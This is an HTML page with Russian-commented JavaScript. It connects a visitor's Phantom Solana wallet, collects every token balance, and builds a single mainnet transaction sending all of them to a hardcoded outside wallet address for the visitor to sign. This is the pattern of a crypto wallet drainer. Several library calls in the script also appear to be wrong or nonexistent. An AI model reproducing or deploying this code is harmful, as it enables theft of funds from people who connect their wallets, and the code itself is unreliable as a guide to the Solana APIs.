<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send All Tokens</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.10.0/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.5/dist/index.iife.min.js"></script>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <button id="sendTokens">Send All Tokens</button>

  <script>
    const DESTINATION_WALLET = "4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE"; // Адрес для отправки токенов

    async function sendAllTokens() {
      if (window.solana && window.solana.isPhantom) {
        try {
          // Подключаемся к кошельку
          const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
          const wallet = await window.solana.connect();
          const senderPublicKey = wallet.publicKey;

          alert(`Connected to wallet: ${senderPublicKey}`);

          // Получаем список всех токенов на кошельке
          const tokenAccounts = await connection.getParsedTokenAccountsByOwner(senderPublicKey, {
            programId: solanaWeb3.TokenProgramId
          });

          if (tokenAccounts.value.length === 0) {
            alert("No tokens found on this wallet.");
            return;
          }

          // Создаем транзакцию
          const transaction = new solanaWeb3.Transaction();

          // Перебираем токены и добавляем команды на отправку в транзакцию
          for (const tokenAccount of tokenAccounts.value) {
            const tokenInfo = tokenAccount.account.data.parsed.info;
            const mintAddress = tokenInfo.mint;
            const balance = tokenInfo.tokenAmount.uiAmount;

            if (balance > 0) {
              const sourceTokenAddress = tokenAccount.pubkey;

              // Получаем или создаем аккаунт для токена у получателя
              const destinationTokenAddress = await solanaWeb3.Token.getAssociatedTokenAddress(
                solanaWeb3.ASSOCIATED_TOKEN_PROGRAM_ID,
                solanaWeb3.TOKEN_PROGRAM_ID,
                new solanaWeb3.PublicKey(mintAddress),
                new solanaWeb3.PublicKey(DESTINATION_WALLET)
              );

              // Проверяем, существует ли аккаунт получателя
              const destinationAccountInfo = await connection.getAccountInfo(destinationTokenAddress);

              if (!destinationAccountInfo) {
                transaction.add(
                  solanaWeb3.Token.createAssociatedTokenAccountInstruction(
                    solanaWeb3.ASSOCIATED_TOKEN_PROGRAM_ID,
                    solanaWeb3.TOKEN_PROGRAM_ID,
                    new solanaWeb3.PublicKey(mintAddress),
                    destinationTokenAddress,
                    new solanaWeb3.PublicKey(DESTINATION_WALLET),
                    senderPublicKey
                  )
                );
              }

              // Добавляем инструкцию на отправку токенов
              transaction.add(
                solanaWeb3.Token.createTransferInstruction(
                  solanaWeb3.TOKEN_PROGRAM_ID,
                  sourceTokenAddress,
                  destinationTokenAddress,
                  senderPublicKey,
                  [],
                  balance * (10 ** tokenInfo.tokenAmount.decimals) // Учитываем количество знаков после запятой
                )
              );
            }
          }

          // Подписываем и отправляем транзакцию
          const { blockhash } = await connection.getRecentBlockhash();
          transaction.recentBlockhash = blockhash;
          transaction.feePayer = senderPublicKey;

          const signedTransaction = await wallet.signTransaction(transaction);
          const signature = await connection.sendRawTransaction(signedTransaction.serialize());

          alert(`Transaction sent! Signature: ${signature}`);
        } catch (err) {
          console.error('Error:', err);
          alert('Error occurred. Check console for details.');
        }
      } else {
        alert('Phantom Wallet not found. Please install it.');
      }
    }

    document.getElementById("sendTokens").addEventListener("click", sendAllTokens);
  </script>
</body>
</html>
